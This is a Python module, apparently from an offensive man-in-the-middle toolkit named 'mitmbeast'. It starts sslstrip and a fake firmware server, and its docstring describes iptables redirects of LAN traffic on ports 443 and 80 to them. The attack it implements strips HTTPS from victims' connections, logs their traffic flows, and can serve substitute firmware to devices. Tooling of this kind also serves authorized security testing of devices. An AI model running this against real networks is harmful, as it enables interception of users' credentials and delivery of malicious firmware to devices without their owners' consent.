"""sslstrip lifecycle — spawn sslstrip + fake firmware server.

Replaces the v1.1 ``mitm.sh`` flow for ``-m sslstrip``:

  1. Spawn the legacy ``fake-firmware-server.py`` on ``cfg.SSLSTRIP_FAKE_SERVER_PORT``
  2. Spawn ``sslstrip -l <port> -w <log>``
  3. Add iptables: redirect ``LAN_IP:443 -> sslstrip`` and
     ``LAN_IP:80 -> fakefw`` (handled by :mod:`mitmbeast.core.router`)
"""
from __future__ import annotations

import os
import signal
import subprocess
import time
from dataclasses import dataclass
from datetime import datetime
from pathlib import Path

from mitmbeast.core.config import MitmConfig
from mitmbeast.core.proxy import fakefw

__all__ = [
    "SSLSTRIP_LOG_DIR",
    "SslstripError",
    "SslstripSession",
    "start",
    "stop",
]


SSLSTRIP_LOG_DIR = Path("./sslstrip_logs")


class SslstripError(RuntimeError):
    """Raised when sslstrip fails to start."""


@dataclass(frozen=True, slots=True)
class SslstripSession:
    sslstrip_pid: int
    fakefw_pid: int
    session_dir: Path


def start(cfg: MitmConfig) -> SslstripSession:
    """Start sslstrip + fake-firmware-server, return session info."""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")  # noqa: DTZ005
    SSLSTRIP_LOG_DIR.mkdir(parents=True, exist_ok=True)
    session = SSLSTRIP_LOG_DIR / f"session_{timestamp}"
    session.mkdir(parents=True, exist_ok=True)

    # 1. fake firmware server (HTTP only, on the configured port)
    fakefw_pid = fakefw.start_http(
        port=cfg.SSLSTRIP_FAKE_SERVER_PORT,
        firmware_dir="./firmware",
        log_path=session / "fake_server.log",
    )

    # 2. sslstrip — listens on cfg.SSLSTRIP_PORT, writes session log
    log_path = session / "sslstrip.log"
    cmd = ["sslstrip",
           "-l", str(cfg.SSLSTRIP_PORT),
           "-w", str(session / "sslstrip-flows.log")]
    log_fh = log_path.open("ab")
    proc = subprocess.Popen(  # noqa: S603 — argv list, no shell
        cmd, stdout=log_fh, stderr=subprocess.STDOUT,
        start_new_session=True,
    )
    time.sleep(0.3)
    if proc.poll() is not None:
        tail = log_path.read_text(errors="replace").splitlines()[-10:]
        # Tear down the fakefw we just started so we don't leak it
        fakefw.stop(fakefw_pid)
        raise SslstripError(
            f"sslstrip exited {proc.returncode} on startup. Last log lines:\n"
            + "\n".join(tail)
        )

    return SslstripSession(
        sslstrip_pid=proc.pid,
        fakefw_pid=fakefw_pid,
        session_dir=session,
    )


def stop(session: SslstripSession, *, timeout: float = 3.0) -> None:
    """Stop sslstrip + fake server."""
    if _alive(session.sslstrip_pid):
        try:
            os.kill(session.sslstrip_pid, signal.SIGTERM)
        except ProcessLookupError:
            pass
        deadline = time.monotonic() + timeout
        while _alive(session.sslstrip_pid) and time.monotonic() < deadline:
            time.sleep(0.05)
        if _alive(session.sslstrip_pid):
            try:
                os.kill(session.sslstrip_pid, signal.SIGKILL)
            except ProcessLookupError:
                pass
    fakefw.stop(session.fakefw_pid, timeout=timeout)


def _alive(pid: int) -> bool:
    try:
        os.kill(pid, 0)
        return True
    except (ProcessLookupError, PermissionError):
        return False
